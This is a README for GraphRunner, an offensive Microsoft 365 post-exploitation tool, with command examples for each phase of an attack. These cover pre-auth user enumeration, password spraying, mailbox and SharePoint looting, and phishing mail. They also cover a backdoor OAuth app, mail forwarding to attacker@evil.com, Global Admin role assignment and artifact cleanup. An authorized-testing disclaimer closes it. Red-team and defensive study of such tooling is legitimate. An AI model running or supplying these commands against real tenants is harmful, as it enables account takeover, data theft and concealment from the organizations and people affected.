# GraphRunner

**M365 Post-Exploitation Framework** — A single-binary Go tool for Microsoft 365 / Azure AD reconnaissance, persistence, privilege escalation, data pillaging, and cleanup via the Microsoft Graph API.

```
   ██████╗ ██████╗  █████╗ ██████╗ ██╗  ██╗██████╗ ██╗   ██╗███╗   ██╗███╗   ██╗███████╗██████╗
  ██╔════╝ ██╔══██╗██╔══██╗██╔══██╗██║  ██║██╔══██╗██║   ██║████╗  ██║████╗  ██║██╔════╝██╔══██╗
  ██║  ███╗██████╔╝███████║██████╔╝███████║██████╔╝██║   ██║██╔██╗ ██║██╔██╗ ██║█████╗  ██████╔╝
  ██║   ██║██╔══██╗██╔══██║██╔═══╝ ██╔══██║██╔══██╗██║   ██║██║╚██╗██║██║╚██╗██║██╔══╝  ██╔══██╗
  ╚██████╔╝██║  ██║██║  ██║██║     ██║  ██║██║  ██║╚██████╔╝██║ ╚████║██║ ╚████║███████╗██║  ██║
   ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝     ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═══╝╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝
```

> **v0.2.0** — 80+ subcommands across 8 command groups. ~15 MB static binary. Zero runtime dependencies.

---

## Table of Contents

- [Features](#features)
- [Installation](#installation)
- [Quick Start](#quick-start)
- [Command Reference](#command-reference)
  - [auth](#auth---authentication--session-management)
  - [recon](#recon---reconnaissance--enumeration)
  - [pillage](#pillage---data-exfiltration--search)
  - [persist](#persist---persistence-mechanisms)
  - [escalate](#escalate---privilege-escalation)
  - [cleanup](#cleanup---artifact-removal)
  - [spray](#spray---password-spray--enumeration)
  - [run](#run---orchestrated-full-run)
- [Global Flags](#global-flags)
- [Token Store](#token-store)
- [Output System](#output-system)
- [Keyword Detectors](#keyword-detectors)
- [Proxy Support](#proxy-support)
- [Architecture](#architecture)
- [Permissions Reference](#permissions-reference)
- [Legal Disclaimer](#legal-disclaimer)

---

## Features

- **Single static binary** — no Python, no Node, no runtime dependencies. Drop and run.
- **Encrypted multi-session token store** — AES-256-GCM with PBKDF2-SHA256 (600k iterations). Manage multiple tenants/identities simultaneously.
- **8 command groups, 80+ subcommands** — full M365 attack lifecycle from recon through cleanup.
- **Pre-auth modules** — user enumeration and domain recon without any credentials.
- **Token manipulation** — device code, client credentials, ROPC, certificate auth, token import, token swap (TokenTactics-style).
- **Auto-pagination** — follows `@odata.nextLink` automatically on all API calls.
- **Rate limit handling** — automatic retry with backoff on 429 responses.
- **Multiple output formats** — JSON (auto-saved), HTML reports, CSV export, log file tee.
- **Proxy support** — route all traffic through Burp/ZAP/mitmproxy with a single flag.
- **Verbose mode** — per-item progress output for all modules.

---

## Installation

### Build from source

```bash
# Requires Go 1.21+
git clone <repo-url> graphrunner
cd graphrunner
go build -o graphrunner ./cmd/graphrunner
```

### Cross-compile

```bash
# Linux
GOOS=linux GOARCH=amd64 go build -o graphrunner-linux ./cmd/graphrunner

# Windows
GOOS=windows GOARCH=amd64 go build -o graphrunner.exe ./cmd/graphrunner

# macOS
GOOS=darwin GOARCH=arm64 go build -o graphrunner-macos ./cmd/graphrunner
```

The output is a **single static binary** (~15 MB). No dependencies to install on the target.

---

## Quick Start

### 1. Authenticate (device code flow — zero flags needed)

```bash
./graphrunner auth login
```

This uses the Azure PowerShell public client ID by default. Follow the device code prompt to authenticate.

### 2. Check your identity

```bash
./graphrunner auth whoami
```

### 3. Run reconnaissance

```bash
# Single module
./graphrunner recon users
./graphrunner recon groups
./graphrunner recon apps

# All recon modules at once
./graphrunner recon all
```

### 4. Search for secrets

```bash
# Mailbox
./graphrunner pillage mailbox --keywords "password,secret,api key"

# SharePoint/OneDrive
./graphrunner pillage kql-search --query "password filetype:xlsx"

# Teams messages
./graphrunner pillage teams --keywords "credentials,token"
```

### 5. Full orchestrated run

```bash
./graphrunner run --keywords "password,secret,key" --output-json report.json --output-html report.html
```

---

## Command Reference

### `auth` — Authentication & Session Management

| Command | Description | Auth Required |
|---------|-------------|:---:|
| `auth login` | Interactive device code login (or ROPC with `--username`/`--password`) | No |
| `auth app-login` | Client credentials (app-only) authentication | No |
| `auth cert-login` | Certificate authentication (PFX/PEM, client_assertion JWT) | No |
| `auth import-token` | Import tokens from other tools (ROADTools, AADInternals, etc.) | No |
| `auth refresh` | Force token refresh for a session | Yes |
| `auth sessions` | List all stored sessions with status | No |
| `auth use <name>` | Switch the active session | No |
| `auth logout <name>` | Remove a stored session | No |
| `auth whoami` | Show identity from JWT claims (UPN, OID, tenant, expiry) | Yes |
| `auth token` | Print the access token (pipe to curl with `-r`) | Yes |
| `auth token-swap` | Swap refresh token for a different resource (TokenTactics-style) | Yes |
| `auth watch` | Background auto-refresh loop (runs until Ctrl+C) | Yes |

**Examples:**

```bash
# Device code with custom tenant/client
./graphrunner auth login --tenant-id contoso.com --client-id <your-client-id>

# ROPC (username/password)
./graphrunner auth login --username user@contoso.com --password 'P@ssw0rd'

# Client credentials (app-only)
./graphrunner auth app-login --tenant-id <tid> --client-id <cid> --client-secret <secret>

# Certificate auth
./graphrunner auth cert-login --tenant-id <tid> --client-id <cid> --cert ./cert.pfx --pfx-password 'pass'

# Import token from another tool
./graphrunner auth import-token --access-token "eyJ0eXAi..." --name stolen-token

# Token swap to different resource (9 targets: graph, azure, outlook, vault, storage, substrate, teams, office, core-mgmt)
./graphrunner auth token-swap --resource vault
./graphrunner auth token-swap --list  # Show all available resources

# Print raw token for piping
curl -H "Authorization: Bearer $(./graphrunner auth token -r)" https://graph.microsoft.com/v1.0/me

# Keep token alive in background
./graphrunner auth watch --interval 300
```

---

### `recon` — Reconnaissance & Enumeration

| Command | Description | Auth | Notes |
|---------|-------------|:---:|-------|
| `recon tenant` | Organization info, auth policy, licensed SKUs | Yes | |
| `recon users` | All directory users (50+ attributes incl. onPremises*) | Yes | |
| `recon groups` | Security/dynamic/public groups + member lists | Yes | |
| `recon apps` | App registrations, service principals, OAuth grants | Yes | |
| `recon caps` | Conditional Access policies (enabled/disabled) | Yes | |
| `recon roles` | Privileged role assignments with principal names | Yes | |
| `recon mfa-status` | MFA registration status per user | Yes | |
| `recon devices` | Registered/joined devices (compliance, platform) | Yes | |
| `recon sharepoint` | Quick SharePoint site URL discovery | Yes | |
| `recon sharepoint-deep` | Deep SP enumeration: public sites, permissions, drives, lists | Yes | |
| `recon sp-audit` | Full SP audit: exposure, public sites, file counts, risk table | Yes | |
| `recon open-inboxes` | Scan for mailboxes accessible to current token | Yes | |
| `recon audit-logs` | Directory audit + sign-in logs (beta) | Yes | Requires `AuditLog.Read.All` |
| `recon named-locations` | CA trusted IPs and countries | Yes | |
| `recon intune-devices` | Intune managed devices (compliance, encryption) | Yes | Requires `DeviceManagementManagedDevices.Read.All` |
| `recon cross-tenant` | Cross-tenant access policies, B2B config | Yes | |
| `recon sp-secrets` | App/SP credential enumeration (expired, expiring, weak) | Yes | |
| `recon delegated-perms` | All oauth2PermissionGrants with high-risk flagging | Yes | |
| `recon app-proxy` | Azure AD Application Proxy discovery | Yes | Beta endpoint |
| `recon user-enum` | User enumeration via GetCredentialType | **No** | Pre-auth, no token needed |
| `recon domain-info` | Domain federation, tenant ID, auth URLs | **No** | Pre-auth, no token needed |
| `recon all` | Run all authenticated recon modules | Yes | |

**Examples:**

```bash
# Pre-auth reconnaissance (no credentials needed)
./graphrunner recon user-enum --users "admin@contoso.com,hr@contoso.com"
./graphrunner recon user-enum --user-file users.txt --delay 2
./graphrunner recon domain-info contoso.com

# Full tenant recon
./graphrunner recon all -v

# SharePoint audit with risk assessment
./graphrunner recon sp-audit

# Find expired/weak secrets
./graphrunner recon sp-secrets

# Audit logs with OData filter
./graphrunner recon audit-logs --filter "activityDisplayName eq 'Add member to role'" --top 50

# Export to CSV
./graphrunner recon users --output-csv users.csv
```

---

### `pillage` — Data Exfiltration & Search

| Command | Description |
|---------|-------------|
| `pillage mailbox` | Search mailbox content by keywords |
| `pillage inbox` | Read inbox messages for a user |
| `pillage sharepoint` | Search and download SharePoint/OneDrive files by keywords |
| `pillage kql-search` | KQL search across SP/OneDrive — returns driveID+itemID for download |
| `pillage sp-search` | Graph Search API with configurable entity types |
| `pillage sp-download` | Search SP and bulk-download all matching driveItems |
| `pillage sp-files` | List/download files from SP drives directly (no Search API) |
| `pillage teams` | Search Teams messages by keywords |
| `pillage chats` | Download Teams 1:1 chat conversations |
| `pillage onedrive` | Recursive OneDrive file listing + download with extension filter |
| `pillage notebooks` | OneNote notebooks, sections, pages (keyword filter) |
| `pillage calendar` | Calendar events + meeting links (Teams/Zoom/Webex with passwords) |
| `pillage user-attrs` | Search all user directory attributes for sensitive data |
| `pillage contacts` | Outlook contacts enumeration |
| `pillage planner` | Planner plans and tasks |
| `pillage send-mail` | Send mail as a user |
| `pillage download` | Download a single file by drive+item ID |

**Examples:**

```bash
# KQL search (full KQL syntax supported)
./graphrunner pillage kql-search --query "password filetype:xlsx"
./graphrunner pillage kql-search --query "confidential AND (filetype:docx OR filetype:pdf)" --limit 50
./graphrunner pillage kql-search --query "*.config OR *.env OR *.key" --download-dir ./loot
./graphrunner pillage kql-search --query "author:admin@contoso.com created>2024-01-01"

# Browse SharePoint drive files directly
./graphrunner pillage sp-files --site-id <site-id> --extensions docx,xlsx,pdf
./graphrunner pillage sp-files --drive-id <drive-id> --download-dir ./loot --depth 5

# OneDrive listing + selective download
./graphrunner pillage onedrive --user admin@contoso.com --extensions xlsx,docx --download-dir ./loot

# Read someone's inbox
./graphrunner pillage inbox --user admin@contoso.com --top 50

# Calendar recon (meeting links, passwords)
./graphrunner pillage calendar --user admin@contoso.com

# OneNote with keyword filtering
./graphrunner pillage notebooks --user admin@contoso.com --keywords "password,secret,api"

# Download a specific file (use driveID+itemID from kql-search or sp-files output)
./graphrunner pillage download --drive-id <did> --item-id <iid> --output secret.xlsx

# Send phishing mail
./graphrunner pillage send-mail --to "victim@contoso.com" --subject "IT Support" --body "<html>..." --html
```

---

### `persist` — Persistence Mechanisms

| Command | Description |
|---------|-------------|
| `persist inject-app` | Create a backdoor OAuth application with delegated permissions |
| `persist clone-group` | Clone a security group (same display name) |
| `persist invite-guest` | Invite an external guest user to the tenant |
| `persist add-member` | Add a user/SP to a security group |
| `persist add-key-cred` | Add a certificate credential to an app (shadow cred) |
| `persist mail-rule` | Create inbox forwarding rule (email exfiltration) |
| `persist list-mail-rules` | List existing inbox rules (detect persistence) |

**Examples:**

```bash
# Backdoor OAuth app (auto-requests dangerous permissions)
./graphrunner persist inject-app --app-name "Microsoft 365 Compliance" --preset backdoor

# Shadow cert credential (stealthier than passwords)
./graphrunner persist add-key-cred --app-id <object-id> --valid-days 365

# Email forwarding rule
./graphrunner persist mail-rule --user-id admin@contoso.com --forward-to attacker@evil.com --keywords "password,secret"

# Detect existing forwarding rules
./graphrunner persist list-mail-rules --user-id admin@contoso.com

# Invite external guest
./graphrunner persist invite-guest --email attacker@evil.com --display-name "IT Support"
```

---

### `escalate` — Privilege Escalation

| Command | Description |
|---------|-------------|
| `escalate add-app-creds` | Add a client secret to an app (by object ID or display name) |
| `escalate add-sp-secret` | Inject a password secret into a service principal |
| `escalate assign-role` | Assign a directory role (e.g., Global Admin) to a user or SP |
| `escalate list-roles` | List all directory role definitions |
| `escalate grant-app-perm` | Grant application permissions (appRoleAssignment) to a SP |
| `escalate admin-consent` | Grant admin consent (AllPrincipals) for delegated permissions |
| `escalate reset-password` | Reset a user's password |
| `escalate add-owner` | Add yourself as owner of an app or group |

**Examples:**

```bash
# Add secret to an app you own
./graphrunner escalate add-app-creds --app-name "Some App" --expire-days 365

# Add secret directly to service principal
./graphrunner escalate add-sp-secret --sp-id <sp-object-id>

# Assign Global Admin role
./graphrunner escalate list-roles  # find the role ID first
./graphrunner escalate assign-role --role-id <role-id> --principal-id <user-oid>

# Grant Mail.ReadWrite to a service principal (auto-resolves Graph SP)
./graphrunner escalate grant-app-perm --sp-id <sp-id> --role-id <mail-readwrite-role-id>

# Admin consent for delegated permissions
./graphrunner escalate admin-consent --sp-id <sp-id> --scopes "Mail.Read Mail.ReadWrite Files.Read.All"

# Reset user password
./graphrunner escalate reset-password --user-id victim@contoso.com --password "NewP@ssw0rd!"

# Take ownership
./graphrunner escalate add-owner --app-id <app-object-id> --principal-id <your-oid>
./graphrunner escalate add-owner --group-id <group-id> --principal-id <your-oid>
```

---

### `cleanup` — Artifact Removal

| Command | Description |
|---------|-------------|
| `cleanup delete-app` | Delete an application registration |
| `cleanup delete-group` | Delete a group |
| `cleanup remove-member` | Remove a member from a group |
| `cleanup remove-secret` | Remove a password credential from an app or SP |
| `cleanup remove-key-cred` | Remove a certificate credential from an app |
| `cleanup remove-mail-rule` | Delete an inbox rule from a user's mailbox |

**Examples:**

```bash
# Remove backdoor app
./graphrunner cleanup delete-app --app-id <object-id>

# Remove injected secret
./graphrunner cleanup remove-secret --app-id <object-id> --key-id <key-id>
./graphrunner cleanup remove-secret --sp-id <sp-object-id> --key-id <key-id>

# Remove certificate credential
./graphrunner cleanup remove-key-cred --app-id <object-id> --key-id <key-id>

# Remove forwarding rule
./graphrunner cleanup remove-mail-rule --user-id admin@contoso.com --rule-id <rule-id>
```

---

### `spray` — Password Spray & Enumeration

| Command | Description | Auth |
|---------|-------------|:---:|
| `spray password` | Password spray via ROPC | No |
| `spray brute-clientid` | Enumerate valid client IDs in a tenant | No |

**Examples:**

```bash
# Password spray
./graphrunner spray password --tenant-id contoso.com --user-file users.txt --passwords "Spring2024!,Welcome1!" --delay 30

# Enumerate valid client IDs
./graphrunner spray brute-clientid --tenant-id contoso.com --builtin
./graphrunner spray brute-clientid --tenant-id contoso.com --ids "custom-guid-1,custom-guid-2"
```

---

### `run` — Orchestrated Full Run

Executes a full attack workflow: **Recon → Mailbox Search → SharePoint Search → Teams Search**.

```bash
./graphrunner run \
  --keywords "password,secret,credential,api key" \
  --output-json report.json \
  --output-html report.html
```

| Flag | Description |
|------|-------------|
| `--keywords` | Comma-separated detector keywords (default: `password,secret,credential,key,token`) |
| `--disable-recon` | Skip reconnaissance phase |
| `--disable-email` | Skip mailbox search |
| `--disable-teams` | Skip Teams message search |
| `--output-json` | Write JSON report to file |
| `--output-html` | Write HTML report to file |

---

## Global Flags

These flags are available on **every** command:

| Flag | Description | Default |
|------|-------------|---------|
| `--passphrase` | Passphrase for token store encryption | Machine-derived (hostname:username) |
| `-s, --session` | Use a specific session by name | Active session |
| `-v, --verbose` | Show per-item progress output | `false` |
| `--log-file` | Tee all output to a plain-text file (no ANSI) | |
| `--output-dir` | Directory for auto-saved JSON results | `./output` |
| `--output-csv` | Export tabular results to CSV file | |
| `--proxy` | HTTP proxy URL (e.g., `http://127.0.0.1:8080`) | |

---

## Token Store

GraphRunner stores all tokens in an **encrypted file** at `~/.graphrunner/sessions.enc`.

- **Encryption**: AES-256-GCM
- **Key derivation**: PBKDF2-SHA256 with 600,000 iterations
- **Default key**: Derived from `hostname:username` (machine-specific)
- **Custom key**: Use `--passphrase` to set your own

**Multi-session support**: You can have multiple sessions active simultaneously (different tenants, different users, app-only vs delegated). Switch between them with `auth use <name>` or per-command with `-s <name>`.

```bash
./graphrunner auth sessions          # List all sessions
./graphrunner auth use my-session    # Switch active session
./graphrunner recon users -s admin   # Use "admin" session for this command only
```

---

## Output System

All command results are automatically saved:

### Auto-save (JSON)

Every command result is saved to `./output/<command>-<timestamp>.json` and `./output/<command>-latest.json`. Override the directory with `--output-dir`.

### CSV Export

```bash
./graphrunner recon users --output-csv users.csv
```

Nested JSON fields are auto-flattened with dot notation (e.g., `onPremisesExtensionAttributes.extensionAttribute1`).

### HTML Reports

```bash
./graphrunner recon all --output-html report.html
```

### Log Tee

```bash
./graphrunner recon all --log-file audit.log
```

Writes a plain-text copy of all console output (ANSI codes stripped) to the specified file.

---

## Keyword Detectors

GraphRunner ships with 6 built-in keyword presets for search operations:

| Preset | Keywords |
|--------|----------|
| `credentials` | password, secret, credential, key, token, api_key, apikey, passwd, private_key |
| `finance` | invoice, payment, salary, bank, routing, swift, iban, ssn, tax |
| `pii` | social security, passport, driver license, date of birth, national id |
| `infra` | vpn, firewall, jump box, bastion, admin portal, rdp, ssh |
| `m365` | global admin, conditional access, app registration, service principal, tenant |
| `all` | All of the above combined |

Custom detector configuration can be placed in `detectors.json`.

---

## Proxy Support

Route all Graph API traffic through an intercepting proxy:

```bash
./graphrunner --proxy http://127.0.0.1:8080 recon users
```

- Automatically skips TLS verification when a proxy is set (for Burp/ZAP/mitmproxy interception)
- Works with all commands

---

## Architecture

```
graphrunner/
├── cmd/graphrunner/
│   └── main.go              # CLI entry point (Cobra), all command definitions
├── internal/
│   ├── auth/
│   │   ├── auth.go           # Authenticator (manages all auth flows)
│   │   ├── devicecode.go     # Device code flow
│   │   ├── clientcreds.go    # Client credentials flow
│   │   ├── ropc.go           # Resource Owner Password Credentials
│   │   ├── certlogin.go      # Certificate auth (PFX/PEM, RS256 JWT assertion)
│   │   ├── refresh.go        # Token refresh logic
│   │   ├── tokenstore.go     # AES-256-GCM encrypted multi-session store
│   │   └── tokenswap.go      # Cross-resource token swap (TokenTactics)
│   ├── config/
│   │   ├── config.go         # App configuration, session management
│   │   └── detectors.go      # Keyword preset system
│   ├── graph/
│   │   ├── client.go         # HTTP client (pagination, retry, rate limits, proxy)
│   │   └── endpoints.go      # Graph API endpoint constants
│   ├── modules/
│   │   ├── recon/            # 20+ reconnaissance modules
│   │   ├── pillage/          # 16+ data exfiltration modules
│   │   ├── persist/          # 7 persistence modules
│   │   ├── escalate/         # 8 privilege escalation modules
│   │   ├── cleanup/          # 6 cleanup operations
│   │   └── spray/            # Password spray + client ID brute
│   └── output/
│       ├── console.go        # Styled terminal output (lipgloss)
│       ├── json.go           # JSON reporter + auto-save
│       ├── html.go           # HTML report generator
│       ├── csv.go            # CSV export with auto-flatten
│       └── logger.go         # Tee logger (strip ANSI, write plain text)
└── go.mod                    # Minimal deps: cobra, lipgloss, x/crypto
```

### Key Design Decisions

- **Raw `net/http`** for all Graph API calls — no heavy SDK, full control over requests
- **Zero external auth libraries** — custom OAuth2 flows for maximum flexibility
- **Minimal dependencies** — only Cobra (CLI), Lipgloss (styling), and x/crypto (PBKDF2)
- **Context-aware** — all operations use `context.Context` for cancellation
- **Auto-pagination** — `GetAll()` follows `@odata.nextLink` transparently
- **Rate limit retry** — automatic backoff on HTTP 429 with `Retry-After` header respect

---

## Permissions Reference

### Delegated (user) token — Most Useful Scopes

| Permission | Used By |
|---|---|
| `User.Read.All` | recon users, mfa-status |
| `Group.Read.All` | recon groups |
| `Application.Read.All` | recon apps, sp-secrets |
| `Policy.Read.All` | recon caps, named-locations, cross-tenant |
| `Directory.Read.All` | recon roles, devices |
| `Mail.Read` | pillage mailbox, inbox |
| `Mail.Send` | pillage send-mail |
| `Mail.ReadWrite` | persist mail-rule |
| `Files.Read.All` | pillage sharepoint, onedrive, kql-search, sp-files |
| `Sites.Read.All` | recon sharepoint, sp-audit |
| `Chat.Read` | pillage chats |
| `ChannelMessage.Read.All` | pillage teams |
| `Notes.Read.All` | pillage notebooks |
| `Calendars.Read` | pillage calendar |
| `Tasks.Read` | pillage planner |
| `Contacts.Read` | pillage contacts |
| `AuditLog.Read.All` | recon audit-logs |
| `DeviceManagementManagedDevices.Read.All` | recon intune-devices |

### Application (app-only) token — Requires Admin Consent

Most of the above scopes also work as application permissions. Additionally:

| Permission | Used By |
|---|---|
| `Application.ReadWrite.All` | persist inject-app, escalate add-app-creds |
| `Group.ReadWrite.All` | persist clone-group, add-member |
| `RoleManagement.ReadWrite.Directory` | escalate assign-role |
| `AppRoleAssignment.ReadWrite.All` | escalate grant-app-perm |
| `User.ReadWrite.All` | escalate reset-password |

### No Auth Required

These commands work without any token:

- `recon user-enum` — GetCredentialType API
- `recon domain-info` — OpenID/UserRealm endpoints
- `spray password` — ROPC endpoint
- `spray brute-clientid` — OAuth2 device code endpoint

---

## Legal Disclaimer

**This tool is intended for authorized security testing, red team engagements, and educational purposes only.**

You are solely responsible for ensuring that you have explicit written authorization before using this tool against any Microsoft 365 tenant. Unauthorized access to computer systems is illegal in most jurisdictions.

The authors assume no liability for misuse of this tool. Use responsibly and ethically.

---

## License

Private — All Rights Reserved.
